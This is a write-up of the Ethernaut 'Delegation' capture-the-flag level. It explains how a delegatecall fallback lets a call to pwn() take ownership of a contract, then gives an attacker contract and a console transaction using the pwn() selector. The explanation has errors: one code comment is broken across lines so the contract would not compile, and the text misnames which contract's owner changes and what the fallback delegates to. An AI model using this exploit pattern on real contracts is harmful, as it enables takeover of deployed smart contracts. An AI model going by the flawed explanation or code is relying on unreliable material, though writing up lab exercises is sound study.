# Delegation

Sixth Challenge description is as follows:

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Fallback methods
- Method ids

Code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

### Resolution

The goal of this challenge is to claim ownership of the `Delegate` contract. We have some clues from Ethernaut about `delegatecall` and `fallback` methods as well as method ids.

With this information, we can see that the `Delegation` contract has a `fallback` method defined. This method is executed if none of the other functions match the function identifier or no data was provided with the function call.

In this case, if there's no method id that matches with the `Delegation` contract, it will delegate the call to the owner.

So what we could do is to send a transaction with the encoded method id of `pwn()` so the contract will delegate the call via `fallback()` method to the `Delegate` contract and execute the `pwn()` function that will set the us as owner (msg.sender)

The tricky part here is to translate the signature method "pwn()" to the bytecode so the evm can understand it when checking for the signature in the `Delegate` contract.

For that, we are going to just use the Solidity `abi.encodeWithSignature` method in a contract. And heck, if we are deploying a contract we might as well try to hack this one via a contract:

Let's try it!
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract AttackDelegate {
    
    address private delegateAddr = {CONTRACT_DELEGATE_ADDRESS};

    // This function gets the encoded signature and makes a low level call to the delegate 
contract with the bytecode signature -> it won't match to any signature on the contract, so 
 will
execute fallback() method, and this one will delegate the call to another contract that will match to the pwn() signature!

    function takeOwnership() public {
         bytes memory encodedCall = abi.encodeWithSignature("pwn()");
         delegateAddr.call(encodedCall);             
    }

    // Another options is to just get the pwn() encoded string, and use it in a separate transaction from the console.
    function getEncodedCall() public pure returns (bytes memory) {
        return abi.encodeWithSignature("pwn()");
        
    }
}
```

```
// Alternative solution: Send a tx using the provided api from console:
// the data field is taken from getEncodeCall() 
sendTransaction({from: "{YOUR_WALLET_ADDRESS}", to: "{CONTRACT_INSTANCE_ADDRESS}", data: "0xdd365b8b"})
```


And that's it! If we check the ownership on the Delegate contract should have changed! 💥 

## License

[MIT](https://choosealicense.com/licenses/mit/)